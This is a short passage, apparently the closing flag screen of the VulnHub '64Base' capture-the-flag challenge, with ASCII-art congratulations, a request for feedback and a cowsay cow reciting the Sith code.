 |  \| || |  | |\ \  /\  / /   \ \_/ /| |  | || |  | ||/ | |__) || |__    
 | . ` || |  | | \ \/  \/ /     \   / | |  | || |  | |   |  _  / |  __|   
 | |\  || |__| |  \  /\  /       | |  | |__| || |__| |   | | \ \ | |____  
 |_| \_| \____/    \/  \/        |_|   \____/  \____/    |_|  \_\|______| 
                                _  ______  _____  _____  _                
             /\                | ||  ____||  __ \|_   _|| |               
            /  \               | || |__   | |  | | | |  | |               
           / /\ \          _   | ||  __|  | |  | | | |  | |               
          / ____ \        | |__| || |____ | |__| |_| |_ |_|               
         /_/    \_\        \____/ |______||_____/|_____|(_)               
  ______  ______  ______  ______  ______  ______  ______  ______  ______  
 |______||______||______||______||______||______||______||______||______| 
                                                                          

                    I hope you enjoyed this challenge
                    Please leave comments & feedback
                    @ https://www.vulnhub.com/?q=64base
                    -----------------------------------
                    64Base Challenge by 3mrgnc3
                    https://3mrgnc3.ninja/challenges   
                    -----------------------------------


```

``` 
/ Peace is a lie, there is only passion.  \
| Through passion, I gain strength.       |
| Through strength, I gain power. Through |
| power, I gain victory. Through victory, |
| my chains are broken. The Force shall   |
\ free me.                                /
 -----------------------------------------
        \   ^__^
         \  (oo)\_______
            (__)\       )\/\
                ||----w |
                ||     ||
```



